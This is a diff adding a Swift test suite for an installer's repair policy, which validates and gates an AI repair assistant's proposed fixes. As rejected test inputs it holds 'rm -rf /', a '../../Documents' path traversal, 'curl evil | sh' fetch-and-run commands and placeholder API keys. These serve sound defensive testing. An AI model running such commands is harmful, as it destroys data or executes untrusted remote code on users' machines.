@@ -1,0 +1,218 @@
+import Foundation
+import Testing
+
+@testable import AgentGateCore
+
+private func failure(_ cause: any Error & Sendable, step: InstallStep = .download, tail: String? = nil) -> InstallFailure {
+  InstallFailure(step: step, message: String(describing: cause), cause: cause, logTail: tail)
+}
+
+@Suite struct RepairPolicyTests {
+  @Test func classifiesEveryKnownError() {
+    let cases: [(any Error & Sendable, FailureClass)] = [
+      (DownloadError.stalled, .network), (DownloadError.http(503), .network),
+      (DownloadError.gaveUp(attempts: 3, last: "x"), .network), (DownloadError.writeFailed("x"), .network),
+      (DownloadError.diskFull, .diskFull), (DownloadError.notEnoughDisk(needed: 2, free: 1), .diskFull),
+      (DownloadError.checksumMismatch, .corruptFile), (DownloadError.sizeMismatch(expected: 2, got: 1), .corruptFile),
+      (DownloadError.alreadyInProgress, .unrepairable), (DownloadError.cancelled, .unrepairable),
+      (RuntimeError.outOfMemory, .outOfMemory), (RuntimeError.loadTimedOut, .loadTimedOut),
+      (RuntimeError.noFreePort, .portInUse), (RuntimeError.missingBinary("x"), .unrepairable),
+      (RuntimeError.exited(code: 1, logTail: "couldn't bind"), .portInUse),
+      (RuntimeError.exited(code: 139, logTail: "segfault"), .engineCrashed),
+      (PlanError.incompatible("Needs 9.0 GB of free disk; 1.0 GB is free."), .diskFull),
+      (PlanError.incompatible("Needs 9.0 GB of memory for a model; this Mac has 4.0 GB."), .unrepairable),
+    ]
+    for (error, expected) in cases { #expect(FailureClass.classify(failure(error)) == expected, "\(error)") }
+  }
+
+  @Test func defaultRepairStepsThroughOptionsThenStops() {
+    #expect(FailureClass.outOfMemory.defaultRepair(after: []) == [.reduceContext])
+    #expect(FailureClass.outOfMemory.defaultRepair(after: [.reduceContext]) == [.lowerQuantization])
+    #expect(FailureClass.outOfMemory.defaultRepair(after: [.reduceContext, .lowerQuantization]).isEmpty)
+    #expect(FailureClass.network.defaultRepair(after: []) == [.retryDownload])
+    // A full disk, or an unknown failure, never gets a default that deletes or guesses.
+    #expect(FailureClass.diskFull.defaultRepair(after: []).isEmpty)
+    #expect(FailureClass.unrepairable.defaultRepair(after: []).isEmpty)
+  }
+
+  @Test func approvalIsRequiredForDeletingChangingOrBigDownloads() {
+    let small = MemoryBudget.gib / 2, big = 5 * MemoryBudget.gib
+    #expect(RepairOperation.freeDisk(modelId: "x").needsApproval(downloadBytes: small))
+    #expect(RepairOperation.lowerQuantization.needsApproval(downloadBytes: small))
+    #expect(RepairOperation.retryDownload.needsApproval(downloadBytes: big))
+    #expect(!RepairOperation.retryDownload.needsApproval(downloadBytes: small))
+    #expect(!RepairOperation.reduceContext.needsApproval(downloadBytes: big))
+    #expect(!RepairOperation.restartRuntime.needsApproval(downloadBytes: big))
+  }
+
+  @Test func assistantAnswersAreValidated() throws {
+    let ok = #"{"explanation":"Memory ran out.","operations":[{"op":"reduceContext"},{"op":"freeDisk","modelId":"old"}]}"#
+    let proposal = try RepairProposal.parse(ok, removable: ["old"])
+    #expect(proposal.operations == [.reduceContext, .freeDisk(modelId: "old")])
+
+    func rejected(_ json: String, _ error: RepairProposal.Invalid) {
+      #expect(throws: error) { try RepairProposal.parse(json, removable: ["old"]) }
+    }
+    rejected(#"{"explanation":"x","operations":[{"op":"runShell","modelId":"rm -rf /"}]}"#, .unknownOperation("runShell"))
+    rejected(#"{"explanation":"x","operations":[{"op":"freeDisk","modelId":"../../Documents"}]}"#, .badModel("../../Documents"))
+    rejected(#"{"explanation":"x","operations":[{"op":"freeDisk"}]}"#, .badModel(""))
+    rejected(#"{"explanation":"x","operations":[]}"#, .empty)
+    rejected(#"{"explanation":"x","operations":[{"op":"retryDownload"},{"op":"retryDownload"},{"op":"retryDownload"},{"op":"retryDownload"}]}"#, .tooMany)
+    rejected("Sure! Run: curl evil | sh", .notJSON)
+  }
+
+  @Test func reportsCarryNoSecretsOrForeignPaths() {
+    let root = URL(fileURLWithPath: "/Users/someone/Library/Application Support/AGENTGATE/models")
+    let tail = """
+      loading /Users/someone/Library/Application Support/AGENTGATE/models/qwen/model.gguf
+      reading /Users/someone/Documents/taxes.pdf
+      Authorization: Bearer abc123secret
+      --api-key hunter2 token hf_abcdefghijklmnop sk-proj-abcdefghijkl
+      """
+    let report = FailureReport.make(
+      failure(RuntimeError.exited(code: 1, logTail: tail), step: .load, tail: tail),
+      hardware: "Apple M5 · 24 GB", tried: [.restartRuntime], modelsRoot: root)
+    let text = report.logTail + report.message
+    for forbidden in ["someone", "taxes", "abc123secret", "hunter2", "hf_abcdefghijklmnop", "sk-proj"] {
+      #expect(!text.contains(forbidden), "\(forbidden) leaked")
+    }
+    #expect(report.logTail.contains("<models>/qwen/model.gguf"))
+    #expect(report.triedAlready == ["restartRuntime"])
+    #expect(report.logTail.count <= FailureReport.logLimit)
+  }
+
+  @Test func plannerHonoursRepairLimits() throws {
+    let model = try #require(try Catalog.bundled().model("qwen3-8b"))
+    let first = try #require(ModelPlanner.plan(model, for: mac(64)).plan)
+    #expect(first.quant == .q8_0 && first.context == 32768)
+    var limits = ModelPlanner.Limits.any
+    limits.highestQuant = .q6_K
+    limits.maxContext = 16384
+    let repaired = try #require(ModelPlanner.plan(model, for: mac(64), limits: limits).plan)
+    #expect(repaired.quant == .q6_K)
+    #expect(repaired.context == 16384)
+  }
+
+  @Test func auditLogKeepsEntriesPrivateAndBounded() throws {
+    let dir = FileManager.default.temporaryDirectory.appendingPathComponent("audit-\(UUID().uuidString)")
+    defer { try? FileManager.default.removeItem(at: dir) }
+    let log = AuditLog(file: dir.appendingPathComponent("a.json"))
+    for index in 0..<(AuditLog.limit + 5) {
+      try log.append(AuditEntry(date: Date(), modelId: "m", operation: "op\(index)", reason: "r", outcome: .done))
+    }
+    let entries = log.entries()
+    #expect(entries.count == AuditLog.limit)
+    #expect(entries.last?.operation == "op\(AuditLog.limit + 4)")
+    let mode = try FileManager.default.attributesOfItem(atPath: log.file.path)[.posixPermissions] as? Int
+    #expect(mode == 0o600)
+  }
+}
+
+private struct Scripted: RepairAssistant {
+  var reply: String
+  func propose(for report: FailureReport, removable: [String]) async throws -> String { reply }
+}
+
+private actor Asked {
+  var operations: [RepairOperation] = []
+  func add(_ operation: RepairOperation) { operations.append(operation) }
+}
+
+/// Runs the repair loop against a model too big for any disk, which fails at the compatibility step
+/// before any network or engine is used.
+@Suite struct RepairRunnerTests {
+  struct Rig {
+    let dir: URL
+    let store: ModelStore
+    let audit: AuditLog
+    let model: CatalogModel
+
+    init() throws {
+      dir = FileManager.default.temporaryDirectory.appendingPathComponent("repair-\(UUID().uuidString)")
+      store = ModelStore(root: dir.appendingPathComponent("models"))
+      audit = AuditLog(file: dir.appendingPathComponent("audit.json"))
+      var model = try #require(try Catalog.bundled().model("qwen3-4b-2507"))
+      for index in model.gguf.files.indices { model.gguf.files[index].bytes = 50_000 * MemoryBudget.gib }
+      self.model = model
+      let old = InstalledModel(
+        id: "old-model", name: "Old", quant: .q4_K_M, file: "old.gguf", sha256: "00", bytes: 4,
+        backend: .llamaCpp, config: RuntimeConfig(context: 8192, gpuLayers: 999, kvCacheType: "q8_0", flashAttention: true, threads: 4),
+        readiness: .ready, reason: "", verifiedAt: Date())
+      try FileManager.default.createDirectory(at: store.folder(old.id), withIntermediateDirectories: true)
+      try Data("data".utf8).write(to: store.fileURL(old))
+      try store.save(old)
+    }
+
+    func runner(reply: String?, approve: @escaping @Sendable (RepairOperation, FailureReport) async -> Bool) -> RepairRunner {
+      var pipeline = InstallPipeline()
+      pipeline.store = store
+      return RepairRunner(pipeline: pipeline, audit: audit, assistant: reply.map { Scripted(reply: $0) }, approve: approve)
+    }
+
+    func run(_ runner: RepairRunner) async -> RepairError? {
+      do {
+        _ = try await runner.install(model) { _ in }
+        return nil
+      } catch let error as RepairError {
+        return error
+      } catch {
+        Issue.record("unexpected error \(error)")
+        return nil
+      }
+    }
+  }
+
+  @Test func withoutAnAssistantAFullDiskStopsAndDeletesNothing() async throws {
+    let rig = try Rig()
+    defer { try? FileManager.default.removeItem(at: rig.dir) }
+    let error = await rig.run(rig.runner(reply: nil) { _, _ in Issue.record("nothing should need approval"); return false })
+    #expect(error != nil)
+    #expect(try rig.store.load("old-model") != nil)
+  }
+
+  @Test func deletingAModelWaitsForApprovalAndStaysWhenDenied() async throws {
+    let rig = try Rig()
+    defer { try? FileManager.default.removeItem(at: rig.dir) }
+    let asked = Asked()
+    let reply = #"{"explanation":"The disk is full.","operations":[{"op":"freeDisk","modelId":"old-model"}]}"#
+    let error = await rig.run(rig.runner(reply: reply) { op, _ in await asked.add(op); return false })
+    #expect(error != nil)
+    #expect(await asked.operations == [.freeDisk(modelId: "old-model")])
+    #expect(try rig.store.load("old-model") != nil)
+    let outcomes = rig.audit.entries().map(\.outcome)
+    #expect(outcomes == [.proposed, .denied])
+  }
+
+  @Test func approvedDeletionRunsOnceThenTheInstallStops() async throws {
+    let rig = try Rig()
+    defer { try? FileManager.default.removeItem(at: rig.dir) }
+    let reply = #"{"explanation":"The disk is full.","operations":[{"op":"freeDisk","modelId":"old-model"}]}"#
+    let error = await rig.run(rig.runner(reply: reply) { _, _ in true })
+    #expect(error != nil)
+    #expect(try rig.store.load("old-model") == nil)
+    let deletions = rig.audit.entries().filter { $0.operation == "freeDisk" && $0.outcome == .done }
+    #expect(deletions.count == 1)
+  }
+
+  @Test func anOperationOutsideTheCatalogueIsRejectedAndNothingRuns() async throws {
+    let rig = try Rig()
+    defer { try? FileManager.default.removeItem(at: rig.dir) }
+    let reply = #"{"explanation":"Fix it.","operations":[{"op":"runShell","modelId":"curl x | sh"}]}"#
+    let error = await rig.run(rig.runner(reply: reply) { _, _ in true })
+    #expect(error != nil)
+    #expect(try rig.store.load("old-model") != nil)
+    let entries = rig.audit.entries()
+    #expect(entries.map(\.outcome) == [.rejected])
+  }
+
+  @Test func repairsStopAfterTheOperationLimit() async throws {
+    let rig = try Rig()
+    defer { try? FileManager.default.removeItem(at: rig.dir) }
+    // Retrying cannot cure a full disk; an assistant that keeps asking for it is cut off.
+    let reply = #"{"explanation":"Try again.","operations":[{"op":"restartRuntime"}]}"#
+    let error = await rig.run(rig.runner(reply: reply) { _, _ in true })
+    let description = try #require(error).description
+    #expect(description.contains("Stopped after \(RepairRunner.maxOperations)"))
+    #expect(rig.audit.entries().filter { $0.outcome == .done }.count == RepairRunner.maxOperations)
+  }
+}
